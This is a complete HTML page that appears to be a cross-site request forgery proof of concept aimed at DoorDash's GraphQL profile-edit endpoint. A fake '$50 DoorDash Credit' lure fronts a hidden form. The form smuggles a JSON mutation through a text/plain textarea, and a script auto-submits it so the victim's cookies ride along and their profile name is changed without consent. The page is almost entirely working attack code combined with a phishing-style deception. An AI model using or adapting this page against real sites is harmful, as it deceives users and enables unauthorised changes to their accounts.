<!DOCTYPE html>
<html>
<head>
    <meta name="referrer" content="no-referrer">
</head>
<body>
    <h1>Redirecting to your $50 DoorDash Credit...</h1>
    <p>Loading secure verification portal...</p>

    <form id="csrfForm" action="https://www.doordash.com/graphql/editConsumerProfileInformation?_method=GET" method="POST" enctype="text/plain">
        <textarea name='{"operationName":"editConsumerProfileInformation","variables":{"firstName":"CSRF","lastName":"Vulnerable"},"query":"mutation editConsumerProfileInformation($firstName: String, $lastName: String) { updateConsumerProfileInformation(firstName: $firstName, lastName: $lastName) { id firstName lastName } }","ignore":"' style="display:none;">
        </textarea>
        <input type="submit" value="If you are not redirected, click here">
    </form>

    <script>
        // Auto-submit. Because it's a form, the browser will change the 
        // whole tab to the DoorDash URL, taking the cookies with it.
        setTimeout(function() {
            document.getElementById("csrfForm").submit();
        }, 1500);
    </script>
</body>
</html>
